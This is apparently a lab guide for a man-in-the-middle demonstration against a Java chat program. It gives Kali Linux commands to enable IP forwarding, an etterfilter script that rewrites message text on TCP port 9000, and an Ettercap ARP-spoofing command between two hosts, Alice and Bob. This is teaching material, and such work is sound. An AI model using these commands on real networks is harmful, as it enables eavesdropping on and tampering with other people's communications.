Kali + Ettercap setup (bridged NIC)

Setting up Trudy's replacement — ARP spoofing + Ettercap/etterfilter — on a Kali Linux box whose network adapter is in bridge mode to a separate host interface, sitting on the same LAN segment as Alice and Bob.

What "bridge mode" means here: your Kali VM's virtual NIC is attached directly to a physical/host interface rather than NAT'd behind the hypervisor. That just means Kali gets its own IP on the same LAN Alice and Bob are on — which is exactly what ARP spoofing needs (it only works against hosts you can directly ARP against, i.e. same broadcast domain / same subnet). No extra bridging config is needed beyond that; skip straight to confirming the interface and IP below.

0. Confirm the network you're actually on

1

Find Kali's bridged interface name and IP:

ip a

Look for the interface with an IP in the same subnet as Alice and Bob (e.g. all 192.168.0.x). On most Kali VMs this is eth0; write down whatever name ip a actually shows — the rest of this guide calls it IFACE.

2

Confirm Kali can see both targets on that same segment:

ping -c 2 <Alice-IP>
ping -c 2 <Bob-IP>
arp -a

If either ping fails or they don't show up in arp -a, bridging isn't actually putting Kali on their LAN yet — fix that before anything below will work.

1. Enable IP forwarding

Kali needs to actually forward the traffic it intercepts, or every "attack" just drops packets (self-inflicted denial of service, not a MITM):

sudo sysctl -w net.ipv4.ip_forward=1

Verify: cat /proc/sys/net/ipv4/ip_forward should print 1.

2. Write the etterfilter script

This is the sabotage logic — matches a substring in the TCP payload on port 9000 and rewrites it live, automatically, no typing required per message:

# sabotage.ecf
if (ip.proto == TCP && tcp.dst == 9000) {
    if (search(DATA.data, "love")) {
        replace("love", "hate");
        msg("tampered a line\n");
    }
}
Same-length replacements only (for now): etterfilter's replace() doesn't resize the TCP payload — a replacement string a different length than the original gets padded/truncated unpredictably. Keep find and replacement the same length ("love" → "hate" is 4-for-4) for a clean demo. If you need a different length, pad the shorter one with spaces inside the script.

Compile it to the binary form Ettercap actually loads:

etterfilter sabotage.ecf -o sabotage.ef

3. Run Ettercap

sudo ettercap -T -q -i <IFACE> -F sabotage.ef -M arp:remote /<Alice-IP>// /<Bob-IP>//
FlagMeaning
-Ttext UI (no GUI needed)
-qquiet — don't dump every packet, keep the console readable
-i <IFACE>the bridged interface from step 0
-F sabotage.efload the compiled filter
-M arp:remotedo ARP spoofing (replaces the old arpspoof command) for both directions, including traffic to/from a router if relevant
/A// /B//the two targets to spoof between — Alice and Bob's real IPs, ports left blank (any port)

You should see "tampered a line" printed in the Ettercap console the moment a message containing "love" crosses the wire in either direction.

4. Eavesdrop only, no tampering (optional phase)

To just watch traffic in plaintext without the filter active, drop the -F flag and either read Ettercap's own connection view, or open Wireshark on the same IFACE, filter tcp.port==9000, right-click a packet → Follow → TCP Stream.

5. Run Alice and Bob (unchanged)

On their own machines, same as before — nothing about them changed for this attack:

java -cp target/classes com.herrcult69.metm.Bob
java -cp target/classes com.herrcult69.metm.Alice <Bob-IP> 9000

Alice still dials Bob's real IP directly. The spoofing is what makes that traffic detour through Kali first — Alice and Bob never configure or know about Kali at all.

Cleaning up after the demo

# Ctrl+C out of ettercap, then:
sudo sysctl -w net.ipv4.ip_forward=0

Ettercap restores ARP tables on exit by default; if the LAN looks off afterward (e.g. Alice/Bob can't reach each other), reboot or manually ping them from the router to force fresh ARP entries.

Troubleshooting: if ettercap reports targets unreachable, re-check step 0 — this almost always means Kali's bridged NIC isn't actually on Alice/Bob's subnet yet, not an Ettercap problem. ip route should show a route to their subnet via IFACE with no gateway hop needed.
